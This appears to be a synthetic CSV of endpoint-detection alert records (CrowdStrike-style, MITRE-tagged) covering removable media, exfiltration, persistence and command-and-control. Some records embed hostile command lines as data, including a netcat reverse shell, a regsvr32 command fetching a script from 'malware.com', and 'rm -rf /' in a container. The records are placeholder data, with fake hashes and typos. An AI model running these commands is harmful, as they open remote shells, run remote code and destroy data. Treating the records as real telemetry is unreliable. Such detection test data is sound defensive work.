event_id,event_type,event_timestamp,event_category,event_description,severity,event_time,category,mitre_technique,host,event_severity,affected_hosts,event_details,action,detect_description,detect_id,technique,src_ip,src_port,protocol,user_name,process_name,technique_name,affected_host,affected_process,affected_file_path,command_line,parent_process,parent_process_command_line,detection_method,recommended_actions,event_version,event_data,event_name,endpoint,data,rule_name,recommendation,event_subtype,container_name,image_name,image_digest,registry,command,source_ip,destination_ip,process_path,username,detection,actor,host_info,event_url,event_hash,detected_by,details,device,source,target,attack_name,tactic,ip_address,process_id,metadata,alert_type,timestamp,detection_info,sensor_id,hostname,ip,user,domain,process_command_line,process_pid,parent_process_name,parent_process_pid,c2,files,detection_source,web_server_url,web_server_method,type,process,network,event,trigger,remediation,artifact_hiding,process_injection,security_control_disablement,file_deletion,name,affected_entities,dst_ip,kill_chain_phases,file,process_execution,registry_modification,cloud_infrastructure_modification,subtype,detection_details,customer_id,event_info,product,mitre,attack_details,description,destination_port,parent_process_id,email_sender,email_recipient,email_subject,email_urls,email_attachments,Severity,event_Timestamp,Affected_Hostname,Affected_File_Path,Alert_Source,Recommendation,Title,Tactic,Technique,Affected_Image_Path,Injected_Process_Name,Parent_Process_Name,Injection_Technique,indicators,actions,additional_info,file_info,network_info,Timestamp,Description,Loader_Process_Name,Loader_Technique,event_Source,tactics,recommendations,ip_addresses,mac_addresses,operating_system,agent_version,group_name,destination,threat_severity,threat_category,threat_name,ioc,tags,detect_name,rule_description,triggered_rule,alert_rule_name,alert_rule_id,alert_state,alert_time,src,process_tree,remediation_steps,event_categorty,kill_chain,image_loaded,target_image_loaded,target_image_name,target_command_line,EventID,Category,AffectedHostInfo,DetectionDetails,endpoint_id,web_service_name,web_service_path,ioc_type,ioc_value,process_details,host_details,DetectionId,Details,event_action,event_source,status,application,threat,source_port,file_write,RemovableMediaName,RemovableMediaVendor,RemovableMediaType,RemovableMediaSerialNumber,RemovableMediaCapacity,RemovableMediaAccessedTime,RemovableMediaAction,AffectedFilePath,AffectedFileSize,technique_id,event_creator,subtechnique_id,subtechnique,remote_server,mitre_attack_id,cloud_account,org_id,event_event_name,data_source,device_name,file_name,file_size,src_path,dst_path,host_name,file_path,md5_hash,sha256_hash,alert_data,detection_id,detection_time,detection_score,threat_score,device_id,device_external_ip,device_os,device_os_version,policy_name,policy_id,subcategory,file_permission_modification,Domain_Controller_IP,Domain_Controller_Name
095030332,RemovableMediaDetection,2022-03-04T10:25:00Z,External Media Replication,An external device has been detected that may be attempting to replicate data to the endpoint.,high,,,,,,,,,,,,,,,,,Replication Through Removable Media,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Initial Access,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,USB Device,SanDisk,USB flash drive,123456,16 GB,2022-03-04T10:25:00Z,Copied Files,C:\Users\User\Documents\SensitiveData.docx,2 MB,T1091,{'type': 'Endpoint Monitoring'},,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
ABC123-1234-5678-9101-23456789,threat_detection,2022-03-07T14:23:54.123Z,resource hijacking,An attempt to hijack system resources has been detected on the endpoint.,,,,,,critical,,,,,,Resource Hijacking,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Resource Hijacking,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"[{'type': 'host', 'id': '123456', 'name': 'DESKTOP-1234', 'ip_addresses': ['192.168.1.100'], 'os_type': 'Windows'}]",,,,,,,,,,,,,,A suspicious process is attempting to hijack system resources on the endpoint.,,,,,,,,,,,,,,,,,,,,,,,"{'process_name': 'explorer.exe', 'target_resource': 'memory', 'operation': 'write', 'suspicious_action': 'attempt to overwrite critical memory region'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,T1496,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
12345678-1234-1234-1234-123456789012,alert,2023-03-08T14:30:00Z,scheduled Transfer,Scheduled Transfer Detected,,,,,,medium,,,,,,,,,,,cmd.exe,,,,,robocopy C:\LocalFolder \\RemoteServer\Share /E,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,1234,,,,,,,,,,,,,,,,CrowdStrike Falcon,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,\\RemoteServer\Share,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
0930405555,detect,2023-03-03T10:15:30Z,serverless execution,Potential serverless execution detected via PowerShell execution with encoded command.,,,,,,high,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"{'process_name': 'powershell.exe', 'process_command_line': '-EncodedCommand', 'parent_process_name': 'cmd.exe', 'parent_command_line': 'powershell.exe -encodedCommand', 'process_sha256': '9D73B2CF2A1C728FE8B282FDC7EE5DE5', 'parent_sha256': '2E20D26F9C1ACB5547D5BDA70FEBD054', 'status': 'blocked'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
12345678-1234-1234-1234-123456789012,alert,2023-03-08T14:30:00Z,transfer data to cloud,Data Transfer to Cloud Account Detected,,,,,,high,,,,,,,,,,,powershell.exe,,,,,Copy-Item C:\LocalFolder -Destination https://mycloudstorage.com/myfolder,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,5678,,,,,,,,,,,,,,,,CorwdStrike Falcon,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,T1537,https://mycloudstorage.com,,,,,,,,,,,,,,,,,,,,,,,,,,,
04040t0y,threat detection,,Suspicious Use of Valid Accounts Detected,Suspicious activity involving the use of valid accounts was detected on an endpoint.,high,2023-03-03T15:30:00Z,,,,,,,,,,,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,suspicious_activity,,,,,,,,,,,,,"[{'kill_chain_name': 'mitre-attack', 'phase_name': 'command-and-control'}]",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,12345,valid_accounts,"{'provider': 'Crowdstrike Falcon', 'type': 'endpoint_detection_and_response'}",,,,,,,,,,,,,,,,,,,,,,,,
98765,Build image on host,2023-03-10T10:30:00Z,removable_media,,high,,,,,,,,,"A removable media device was inserted and a file transfer occurred, which is commonly associated with data exfiltration or other suspicious activity.",789012,Communication Through Removable Media,,,,user1,explorer.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,USB Drive,confidential.docx,3.5MB,D:\confidential.docx,C:\Users\user1\Documents\confidential.docx,,,,,,,,,,,,,,,,,,,
12345,alert,1646749655000,suspicous container,"A container has been deployed on the system, potentially indicating malicious activity.",High,,,,,,,,,,,Deploy Container,,,,john.doe,docker,,,,,docker run malicious/image,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Defense Evasion,192.168.1.100,5678,,,2023-03-10T10:00:00Z,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,1234,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,example.com,/usr/bin/docker,f1ef997989e37c17eb2a12d56a9ac05d,098f6bcd4621d373cade4e832627b4f6,,,,,,,,,,,,,,,
EDR-23456,Masked Executable,,masked exectuiable,Masked executable detected on host LAPTOP-789,,2022-10-31T12:34:56Z,,,,High,"[{'host_name': 'LAPTOP-789', 'ip_address': '192.168.1.150'}]","{'file_path': 'C:\\Users\\jdoe\\AppData\\Local\\Temp\\mask123.exe', 'source_ip': '192.168.1.151', 'destination_ip': '192.168.1.150'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
032040ttvf,detect,2023-03-10T20:00:00Z,registry_modification,,high,,,,{'hostname': 'desktop01'},,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,{'reason': 'Unauthorized modification of registry key'},,,,,,,,,,,,,,,,,,,,,{'username': 'user01'},,,,,,,,,,,,,,,,,,,,,,,,,,,"{'registry_key': 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run', 'modification_type': 'value_added', 'value_name': 'MaliciousProgram', 'value_data': 'C:\\Program Files\\Malicious\\malware.exe'}",,,,,,,,,An attempt to modify registry keys or values.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
040506yg,comand and control,2023-03-09T12:00:00.000000Z,multi stage channels,Multi-Stage Command and Control,,,,,,high,,,,,,Multi-Stage Channels,,,TCP,,svchost.exe,,,,,,,C:\Windows\explorer.exe,,,,,,,,,,,,,,,,192.168.1.100,10.0.0.2,,,,,,,,,,,,,,Command and Control,,1234,,,,,,,,DOMAIN\user,,C:\Windows\System32\svchost.exe -k netsvcs,,explorer.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,443,5678,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
12345,Remote Access Tools Detection,1646749655000,remote access,Remote access tool detected on the system.,High,2023-03-09T10:30:00Z,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"[{'entity_type': 'Host', 'entity_name': 'workstation-01', 'entity_ip': '192.168.1.100'}]",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"{'process_name': 'nc.exe', 'process_path': 'C:\\Windows\\System32\\nc.exe', 'process_command_line': 'nc.exe -e cmd.exe 10.0.0.2 4444', 'process_hash': 'A2D3F4B5C6E7A8B9', 'process_parent_name': 'cmd.exe', 'process_parent_path': 'C:\\Windows\\System32\\cmd.exe', 'process_parent_hash': 'B9A8E7C6B5F4D3A2', 'network_connections': [{'destination_ip': '10.0.0.2', 'destination_port': '4444', 'protocol': 'TCP'}]}",,,,,,,,,,,,,,
ac4d6c4c6e68488f903a4a10b3c152b2,DetectionSummaryEvent,2023-03-06T15:32:00.000Z,exfiltration,,medium,,,,,,,,,,,,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"{'customer_id': '123456', 'customer_name': 'Acme Corp', 'source': 'CrowdStrike Falcon Platform'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Automated exfiltration attempt detected,,,,,,,,,,,,,,,,,,,,,,,"{'protocol': 'https', 'destination_ip': '10.0.0.2', 'destination_port': 443, 'filename': 'sensitive_data.zip', 'file_hash': 'abcd1234', 'file_size': 1024}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Workstation01,,,,,,,,,,ac4d6c4c6e68488f903a4a10b3c152b2,2023-03-06T15:30:00.000Z,85.0,80.0,d1b31397857945a9a3c3f918a3a7a1e8,192.168.1.101,Windows 10 Pro,20H2,Default Policy,4bd7e4c2-4a3f-4dd2-b00b-1c4139c617d6,automated_exfiltration,,,
EDR-24680,,,Suspiciouis Browser Extension,Browser extension installed on Chrome,,2022-10-15T09:45:00Z,,,,Medium,"[{'host_name': 'LAPTOP-789', 'ip_address': '192.168.1.50'}]","{'extension_name': 'AdBlock Plus', 'browser': 'Chrome', 'browser_version': '95.0.4638.69', 'username': 'jdoe', 'domain': 'MYDOMAIN', 'source_ip': '192.168.1.51', 'destination_ip': '192.168.1.50'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
EDR-67890,Forced Container Administration Command,,forced container administration,Forced container administration command detected on host server01,,2022-12-31T23:59:59Z,,,,High,"[{'host_name': 'server01', 'ip_address': '192.168.1.100'}]","{'container_name': 'webapp', 'command': 'rm -rf /', 'source_process': 'docker', 'source_process_commandline': 'docker exec -it webapp /bin/bash', 'source_process_pid': '1234', 'source_ip': '192.168.1.101', 'destination_ip': '192.168.1.100', 'result': 'Success'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
lllkdl0,detect,2023-03-10T18:00:00Z,process_execution,An attempt to execute a command using a legitimate system tool to evade detection.,medium,,,,{'hostname': 'server01'},,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,{'reason': 'Unauthorized command execution'},,,,,,,,,,,,,,,,,,,,,{'username': 'user01'},,,,,,,,,,,,,,,,,,,,,,,,,,"{'process_name': 'regsvr32.exe', 'command_line': 'regsvr32.exe /s /u /i:http://malware.com/malware.sct scrobj.dll'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
12345,alert,1646749655000,Potential Use of Scheduled Task/Job,A scheduled task/job was created or modified on the system.,high,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"[{'entity_type': 'system_process', 'entity_name': 'Task Scheduler', 'host_info': {'hostname': 'DESKTOP-ABC123', 'ip_address': '192.168.1.100'}, 'description': 'A new scheduled task/job was created or modified on the system.'}]",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
9039r9fj,detect,2023-03-10T13:00:00Z,file_permission_modification,A file or directory permission was modified by an unauthorized user or process.,medium,,,,{'hostname': 'workstation01'},,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,{'reason': 'Unauthorized file permission change'},,,,,,,,,,,,,,,,,,,,,{'username': 'user01'},,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"{'file_path': 'C:\\Windows\\system32\\config\\SAM', 'target_user': 'SYSTEM', 'original_permissions': 'Full Control', 'new_permissions': 'Read-only'}",,
12345,threat detection,2023-03-10T16:15:00Z,Rogue Domain Controller,An unauthorized domain controller has been detected on the network.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Critical,,hostname123,,CrowdStrike Falcon,Isolate the affected host and investigate the nature and purpose of the rogue domain controller. Remove the unauthorized domain controller and remediate any affected systems.,,Persistence,Rogue Domain Controller,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,192.168.1.100,dc1.malicious.local
